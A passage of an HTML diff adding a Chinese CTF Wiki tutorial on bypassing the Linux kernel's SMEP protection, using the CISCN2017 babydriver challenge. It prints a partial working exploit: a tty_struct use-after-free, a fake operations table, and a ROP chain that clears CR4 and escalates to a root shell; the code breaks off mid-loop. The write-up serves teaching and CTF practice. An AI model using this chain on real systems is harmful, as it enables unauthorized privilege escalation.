@@ -3649,6 +3649,18 @@
           
           
 
+
+  <li class="md-nav__item">
+    <a href="../ret2usr/" title="ret2usr" class="md-nav__link">
+      ret2usr
+    </a>
+  </li>
+
+        
+          
+          
+          
+
   
 
 
@@ -3659,9 +3671,64 @@
       
     
     
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        bypass-smep
+      </label>
+    
     <a href="./" title="bypass-smep" class="md-nav__link md-nav__link--active">
       bypass-smep
     </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#smep" title="SMEP" class="md-nav__link">
+    SMEP
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#smep-cr4" title="smep 和 CR4 寄存器" class="md-nav__link">
+    smep 和 CR4 寄存器
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ciscn2017-babydriver" title="CISCN2017 - babydriver" class="md-nav__link">
+    CISCN2017 - babydriver
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+        <li class="md-nav__item">
+          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
+            评论
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
     
   </li>
 
@@ -4094,6 +4161,48 @@
     
   
   
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#smep" title="SMEP" class="md-nav__link">
+    SMEP
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#smep-cr4" title="smep 和 CR4 寄存器" class="md-nav__link">
+    smep 和 CR4 寄存器
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ciscn2017-babydriver" title="CISCN2017 - babydriver" class="md-nav__link">
+    CISCN2017 - babydriver
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+        <li class="md-nav__item">
+          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
+            评论
+          </a>
+        </li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -4108,6 +4217,242 @@
                 
                 
                 <h1 id="bypass-smep">bypass-smep<a class="headerlink" href="#bypass-smep" title="Permanent link">&para;</a></h1>
+<h2 id="smep">SMEP<a class="headerlink" href="#smep" title="Permanent link">&para;</a></h2>
+<p>为了防止 <code>ret2usr</code> 攻击，内核开发者提出了 <code>smep</code> 保护，smep 全称 <code>Supervisor Mode Execution Protection</code>，是内核的一种保护措施，作用是当 CPU 处于 <code>ring0</code> 模式时，执行 <code>用户空间的代码</code> 会触发页错误；这个保护在 arm 中被称为 <code>PXN</code>。</p>
+<p>通过 qemu 启动内核时的选项可以判断是否开启了 smep 保护。
+<div class="codehilite"><pre><span></span>CISCN2017_babydriver <span class="o">[</span>master●●<span class="o">]</span> grep smep ./boot.sh
+qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="s1">&#39;console=ttyS0 root=/dev/ram oops=panic panic=1&#39;</span> -enable-kvm -monitor /dev/null -m 64M --nographic  -smp <span class="nv">cores</span><span class="o">=</span><span class="m">1</span>,threads<span class="o">=</span><span class="m">1</span> -cpu kvm64,+smep
+</pre></div></p>
+<p>也可以通过
+<div class="codehilite"><pre><span></span>CISCN2017_babydriver <span class="o">[</span>master●●<span class="o">]</span> grep smep /proc/cpuinfo 
+flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc cpuid aperfmperf pni pclmulqdq dtes64 monitor ds_cpl vmx est tm2 ssse3 sdbg fma cx16 xtpr pdcm pcid sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand lahf_lm abm 3dnowprefetch cpuid_fault epb invpcid_single pti tpr_shadow vnmi flexpriority ept vpid fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid rdseed adx smap intel_pt xsaveopt dtherm ida arat pln pts
+......
+</pre></div>
+检测该保护是否开启。</p>
+<h3 id="smep-cr4">smep 和 CR4 寄存器<a class="headerlink" href="#smep-cr4" title="Permanent link">&para;</a></h3>
+<p>系统根据 CR4 寄存器的值判断是否开启 smep 保护，当 CR4 寄存器的第 20 位是 1 时，保护开启；是 0 时，保护关闭。</p>
+<p><img alt="" src="http://ww1.sinaimg.cn/large/006AWYXBly1fvzmqcu1irj30py06egmo.jpg" /></p>
+<p>例如，当
+<div class="codehilite"><pre><span></span>$CR4 = 0x1407f0 = 000 1 0100 0000 0111 1111 0000
+</pre></div>
+时，smep 保护开启。而 CR4 寄存器是可以通过 mov 指令修改的，因此只需要
+<div class="codehilite"><pre><span></span><span class="nf">mov</span> <span class="no">cr4</span><span class="p">,</span> <span class="mi">0x1407e0</span>
+<span class="c"># 0x1407e0 = 101 0 0000 0011 1111 00000</span>
+</pre></div>
+即可关闭 smep 保护。</p>
+<p>搜索一下从 <code>vmlinux</code> 中提取出的 gadget，很容易就能达到这个目的。</p>
+<ul>
+<li>如何查看 CR4 寄存器的值？<ul>
+<li>gdb 无法查看 cr4 寄存器的值，可以通过 kernel crash 时的信息查看。为了关闭 smep 保护，常用一个固定值 <code>0x6f0</code>，即 <code>mov cr4, 0x6f0</code>。</li>
+</ul>
+</li>
+</ul>
+<h3 id="ciscn2017-babydriver">CISCN2017 - babydriver<a class="headerlink" href="#ciscn2017-babydriver" title="Permanent link">&para;</a></h3>
+<p>之前已经分析过使用 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_uaf/#ciscn2017-babydriver">uaf 改 cred</a> 的做法，这次换一种方法，通过关闭 smep 保护和 ret2usr 来提权。</p>
+<p>这里选取的方法是先通过 uaf 控制一个 <code>tty_struct</code> 结构，在 <code>open("/dev/ptmx", O_RDWR)</code> 时会分配这样一个结构体</p>
+<p><code>tty_struct</code> 的 <a href="https://code.woboq.org/linux/linux/include/linux/tty.h.html#tty_struct">源码</a> 如下：
+<div class="codehilite"><pre><span></span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">magic</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">kref</span> <span class="n">kref</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">device</span> <span class="o">*</span><span class="n">dev</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">tty_driver</span> <span class="o">*</span><span class="n">driver</span><span class="p">;</span>
+    <span class="k">const</span> <span class="k">struct</span> <span class="n">tty_operations</span> <span class="o">*</span><span class="n">ops</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
+    <span class="cm">/* Protects ldisc changes: Lock tty not pty */</span>
+    <span class="k">struct</span> <span class="n">ld_semaphore</span> <span class="n">ldisc_sem</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">tty_ldisc</span> <span class="o">*</span><span class="n">ldisc</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">mutex</span> <span class="n">atomic_write_lock</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">mutex</span> <span class="n">legacy_mutex</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">mutex</span> <span class="n">throttle_mutex</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">rw_semaphore</span> <span class="n">termios_rwsem</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">mutex</span> <span class="n">winsize_mutex</span><span class="p">;</span>
+    <span class="n">spinlock_t</span> <span class="n">ctrl_lock</span><span class="p">;</span>
+    <span class="n">spinlock_t</span> <span class="n">flow_lock</span><span class="p">;</span>
+    <span class="cm">/* Termios values are protected by the termios rwsem */</span>
+    <span class="k">struct</span> <span class="n">ktermios</span> <span class="n">termios</span><span class="p">,</span> <span class="n">termios_locked</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">termiox</span> <span class="o">*</span><span class="n">termiox</span><span class="p">;</span>    <span class="cm">/* May be NULL for unsupported */</span>
+    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+    <span class="k">struct</span> <span class="n">pid</span> <span class="o">*</span><span class="n">pgrp</span><span class="p">;</span>       <span class="cm">/* Protected by ctrl lock */</span>
+    <span class="k">struct</span> <span class="n">pid</span> <span class="o">*</span><span class="n">session</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">flags</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">count</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">winsize</span> <span class="n">winsize</span><span class="p">;</span>     <span class="cm">/* winsize_mutex */</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="nl">stopped</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span>    <span class="cm">/* flow_lock */</span>
+              <span class="nl">flow_stopped</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span>
+              <span class="nl">unused</span><span class="p">:</span><span class="n">BITS_PER_LONG</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">hw_stopped</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="nl">ctrl_status</span><span class="p">:</span><span class="mi">8</span><span class="p">,</span>    <span class="cm">/* ctrl_lock */</span>
+              <span class="nl">packet</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span>
+              <span class="nl">unused_ctrl</span><span class="p">:</span><span class="n">BITS_PER_LONG</span> <span class="o">-</span> <span class="mi">9</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">receive_room</span><span class="p">;</span>  <span class="cm">/* Bytes free for queue */</span>
+    <span class="kt">int</span> <span class="n">flow_change</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">link</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">fasync_struct</span> <span class="o">*</span><span class="n">fasync</span><span class="p">;</span>
+    <span class="n">wait_queue_head_t</span> <span class="n">write_wait</span><span class="p">;</span>
+    <span class="n">wait_queue_head_t</span> <span class="n">read_wait</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">work_struct</span> <span class="n">hangup_work</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">disc_data</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">driver_data</span><span class="p">;</span>
+    <span class="n">spinlock_t</span> <span class="n">files_lock</span><span class="p">;</span>      <span class="cm">/* protects tty_files list */</span>
+    <span class="k">struct</span> <span class="n">list_head</span> <span class="n">tty_files</span><span class="p">;</span>
+<span class="cp">#define N_TTY_BUF_SIZE 4096</span>
+    <span class="kt">int</span> <span class="n">closing</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">write_buf</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">write_cnt</span><span class="p">;</span>
+    <span class="cm">/* If the tty has a pending do_SAK, queue it here - akpm */</span>
+    <span class="k">struct</span> <span class="n">work_struct</span> <span class="n">SAK_work</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">tty_port</span> <span class="o">*</span><span class="n">port</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">__randomize_layout</span><span class="p">;</span>
+</pre></div></p>
+<p>为什么要控制这个结构体呢？因为其中有另一个很有趣的结构体 <code>tty_operations</code>，<a href="https://code.woboq.org/linux/linux/include/linux/tty_driver.h.html#tty_operations">源码</a> 如下：
+<div class="codehilite"><pre><span></span><span class="k">struct</span> <span class="n">tty_operations</span> <span class="p">{</span>
+    <span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="n">lookup</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_driver</span> <span class="o">*</span><span class="n">driver</span><span class="p">,</span>
+            <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">idx</span><span class="p">);</span>
+    <span class="kt">int</span>  <span class="p">(</span><span class="o">*</span><span class="n">install</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_driver</span> <span class="o">*</span><span class="n">driver</span><span class="p">,</span> <span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">);</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">remove</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_driver</span> <span class="o">*</span><span class="n">driver</span><span class="p">,</span> <span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">);</span>
+    <span class="kt">int</span>  <span class="p">(</span><span class="o">*</span><span class="n">open</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span> <span class="n">tty</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span> <span class="n">filp</span><span class="p">);</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">close</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span> <span class="n">tty</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span> <span class="n">filp</span><span class="p">);</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">shutdown</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">);</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">cleanup</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">);</span>
+    <span class="kt">int</span>  <span class="p">(</span><span class="o">*</span><span class="n">write</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span> <span class="n">tty</span><span class="p">,</span>
+              <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">count</span><span class="p">);</span>
+    <span class="kt">int</span>  <span class="p">(</span><span class="o">*</span><span class="n">put_char</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">ch</span><span class="p">);</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">flush_chars</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">);</span>
+    <span class="kt">int</span>  <span class="p">(</span><span class="o">*</span><span class="n">write_room</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">);</span>
+    <span class="kt">int</span>  <span class="p">(</span><span class="o">*</span><span class="n">chars_in_buffer</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">);</span>
+    <span class="kt">int</span>  <span class="p">(</span><span class="o">*</span><span class="n">ioctl</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">,</span>
+            <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg</span><span class="p">);</span>
+    <span class="kt">long</span> <span class="p">(</span><span class="o">*</span><span class="n">compat_ioctl</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">,</span>
+                 <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg</span><span class="p">);</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">set_termios</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">,</span> <span class="k">struct</span> <span class="n">ktermios</span> <span class="o">*</span> <span class="n">old</span><span class="p">);</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">throttle</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span> <span class="n">tty</span><span class="p">);</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">unthrottle</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span> <span class="n">tty</span><span class="p">);</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">stop</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">);</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">start</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">);</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">hangup</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">break_ctl</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">,</span> <span class="kt">int</span> <span class="n">state</span><span class="p">);</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">flush_buffer</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">);</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">set_ldisc</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">);</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">wait_until_sent</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">,</span> <span class="kt">int</span> <span class="n">timeout</span><span class="p">);</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">send_xchar</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">,</span> <span class="kt">char</span> <span class="n">ch</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">tiocmget</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">tiocmset</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">,</span>
+            <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">set</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">clear</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">resize</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">,</span> <span class="k">struct</span> <span class="n">winsize</span> <span class="o">*</span><span class="n">ws</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">set_termiox</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">,</span> <span class="k">struct</span> <span class="n">termiox</span> <span class="o">*</span><span class="n">tnew</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">get_icount</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">,</span>
+                <span class="k">struct</span> <span class="n">serial_icounter_struct</span> <span class="o">*</span><span class="n">icount</span><span class="p">);</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">show_fdinfo</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">,</span> <span class="k">struct</span> <span class="n">seq_file</span> <span class="o">*</span><span class="n">m</span><span class="p">);</span>
+<span class="cp">#ifdef CONFIG_CONSOLE_POLL</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">poll_init</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_driver</span> <span class="o">*</span><span class="n">driver</span><span class="p">,</span> <span class="kt">int</span> <span class="n">line</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">options</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">poll_get_char</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_driver</span> <span class="o">*</span><span class="n">driver</span><span class="p">,</span> <span class="kt">int</span> <span class="n">line</span><span class="p">);</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">poll_put_char</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_driver</span> <span class="o">*</span><span class="n">driver</span><span class="p">,</span> <span class="kt">int</span> <span class="n">line</span><span class="p">,</span> <span class="kt">char</span> <span class="n">ch</span><span class="p">);</span>
+<span class="cp">#endif</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">proc_show</span><span class="p">)(</span><span class="k">struct</span> <span class="n">seq_file</span> <span class="o">*</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">__randomize_layout</span><span class="p">;</span>
+</pre></div></p>
+<p>大把的函数指针（ pwn 手的风水宝地），因此设想构造下图所示结构体
+<div class="codehilite"><pre><span></span>fake_tty_struct  fake_tty_operations
++---------+      +----------+
+|magic    |  +--&gt;|evil 1    |
++---------+  |   +----------+
+|......   |  |   |evil 2    |
+|......   |  |   +----------+
++---------+  |   |evil 3    |
+|*ops     |--+   +----------+
++---------+      |evil 4    |
+|......   |      +----------+
+|......   |      |......    |
++---------+      +----------+
+</pre></div>
+那么我们就可以通过不同的操作（如 <code>write, ioctl</code> 等）来跳转到不同的 evil 了。</p>
+<p>对这道题目而言，因为开启了 smep 保护，因此如果想 ret2usr 提权，需要修改 cr4 的值，而控制函数指针是不够的，可以控制函数指针进行 stack pivot 等操作到我们排布 rop 链的空间，通过 rop 关闭 smep，进而进行后续操作。</p>
+<blockquote>
+<p>这道题目没给 vmlinux，需要使用 <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a> 解压内核镜像。</p>
+</blockquote>
+<p>关闭 smep 保护后，就可以通过 rop 来为所欲为了，最终的 <a href="https://github.com/bash-c/pwn_repo/blob/master/CISCN2017_babydriver/uaf_tty_struct.c">exp</a> 如下:
+<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp"></span>
+
+<span class="cp">#define prepare_kernel_cred_addr 0xffffffff810a1810</span>
+<span class="cp">#define commit_creds_addr 0xffffffff810a1420</span>
+
+<span class="kt">void</span><span class="o">*</span> <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">30</span><span class="p">];</span>
+
+<span class="kt">size_t</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>
+<span class="kt">void</span> <span class="nf">save_status</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">__asm__</span><span class="p">(</span><span class="s">&quot;mov user_cs, cs;&quot;</span>
+            <span class="s">&quot;mov user_ss, ss;&quot;</span>
+            <span class="s">&quot;mov user_sp, rsp;&quot;</span>
+            <span class="s">&quot;pushf;&quot;</span>
+            <span class="s">&quot;pop user_rflags;&quot;</span>
+            <span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;[*]status has been saved.&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+
+
+<span class="kt">void</span> <span class="nf">get_shell</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">get_root</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="n">pkc</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span> <span class="o">=</span> <span class="n">prepare_kernel_cred_addr</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">cc</span><span class="p">)(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span> <span class="o">=</span> <span class="n">commit_creds_addr</span><span class="p">;</span>
+    <span class="p">(</span><span class="o">*</span><span class="n">cc</span><span class="p">)((</span><span class="o">*</span><span class="n">pkc</span><span class="p">)(</span><span class="mi">0</span><span class="p">));</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">save_status</span><span class="p">();</span>
+
+    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">size_t</span> <span class="n">rop</span><span class="p">[</span><span class="mi">32</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff810d238d</span><span class="p">;</span>      <span class="c1">// pop rdi; ret;</span>
+    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x6f0</span><span class="p">;</span>
+    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff81004d80</span><span class="p">;</span>      <span class="c1">// mov cr4, rdi; pop rbp; ret;</span>
+    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">get_root</span><span class="p">;</span>
+    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff81063694</span><span class="p">;</span>      <span class="c1">// swapgs; pop rbp; ret;</span>
+    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff814e35ef</span><span class="p">;</span>      <span class="c1">// iretq; ret;</span>
+    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">get_shell</span><span class="p">;</span>
+    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>                <span class="cm">/* saved CS */</span>
+    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>            <span class="cm">/* saved EFLAGS */</span>
+    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+
+    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">30</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
